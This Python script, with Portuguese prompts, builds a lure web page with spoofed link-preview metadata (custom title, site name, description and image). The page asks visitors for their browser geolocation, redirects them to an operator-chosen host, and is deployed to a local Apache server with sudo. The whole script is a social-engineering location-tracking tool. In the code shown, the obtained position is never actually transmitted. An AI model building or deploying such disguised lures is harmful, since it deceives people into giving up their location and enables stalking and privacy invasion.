import os
import subprocess

# Cores
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

def print_ascii():
    ascii_art = [
        " ____  __________  _____ ____________",
        "/ __ \\/ ____/ __ \\/ ___// ____/ ____/",
        "/ / / / __/ / / / /\\__ \\/ __/ / /",
        "/ /_/ / /___/ /_/ /___/ / /___/ /___",
        "/_____/_____/_____//____/_____/\\____/"
    ]
    print(C)
    for linha in ascii_art:
        print(f'{linha}')
    print(W)

def criar_index_html(redirect_url, title, sitename, desc, image_url):
    html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta property="og:title" content="{title}">
    <meta property="og:site_name" content="{sitename}">
    <meta property="og:description" content="{desc}">
    <meta property="og:image" content="{image_url}">
    <title>{title}</title>
    <script>
        if (location.protocol === 'http:') {{
            location.href = 'https:' + location.href.slice(5);
        }}
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="js/location.js"></script>
</head>
<body onload="information(); locate(function() {{ window.location = '{redirect_url}/index2.html'; }}, function() {{ document.body.innerHTML = 'Erro ao localizar.'; }} );">
</body>
</html>
"""
    with open('index.html', 'w') as f:
        f.write(html)
    print(f'{Y}[*]{W} index.html criado com geolocalização e redirecionamento.')

def criar_location_js():
    os.makedirs('js', exist_ok=True)
    location_js = """function information() {
    console.log("Iniciando coleta de localização...");
}
function locate(success, error) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            console.log("Localização obtida.");
            success(position);
        }, function() {
            console.log("Erro ao obter localização.");
            error();
        });
    } else {
        console.log("Geolocalização não suportada.");
        error();
    }
}"""
    with open('js/location.js', 'w') as f:
        f.write(location_js)
    print(f'{Y}[*]{W} location.js criado.')

def copiar_arquivos():
    print(f'{Y}[*]{W} Copiando arquivos para /var/www/html...')
    os.system('sudo cp index.html /var/www/html/')
    os.system('sudo mkdir -p /var/www/html/js')
    os.system('sudo cp js/location.js /var/www/html/js/')

def start_apache():
    print(f'{Y}[*]{W} Iniciando o Apache...')
    result = subprocess.run(['sudo', 'service', 'apache2', 'start'], capture_output=True, text=True)
    if result.returncode == 0:
        return True
    print(f'{R}[ERRO]{W} {result.stderr.strip()}')
    return False

def main():
    print_ascii()
    destino = input(f'{C}[?]{W} URL de destino final (ex: https://exemplo.com): ').strip()
    ip = input(f'{C}[?]{W} IP local (ex: 192.168.0.105): ').strip()
    porta = input(f'{C}[?]{W} Porta (ex: 8080): ').strip()
    title = input(f'{C}[?]{W} Título da aba (title): ').strip()
    sitename = input(f'{C}[?]{W} Nome do site (og:site_name): ').strip()
    desc = input(f'{C}[?]{W} Descrição (og:description): ').strip()
    image_url = input(f'{C}[?]{W} URL da imagem (og:image): ').strip()

    if not all([destino, ip, porta, title, sitename, desc, image_url]):
        print(f'{R}[ERRO]{W} Todos os campos são obrigatórios.')
        return

    redirect_url = f"http://{ip}:{porta}"
    criar_index_html(redirect_url, title, sitename, desc, image_url)
    criar_location_js()
    copiar_arquivos()

    if start_apache():
        print(f'{G}[OK]{W} Site hospedado em: {redirect_url}')
    else:
        print(f'{R}[ERRO]{W} Apache não iniciado. O site **não está hospedado**.')

if __name__ == "__main__":
    main()
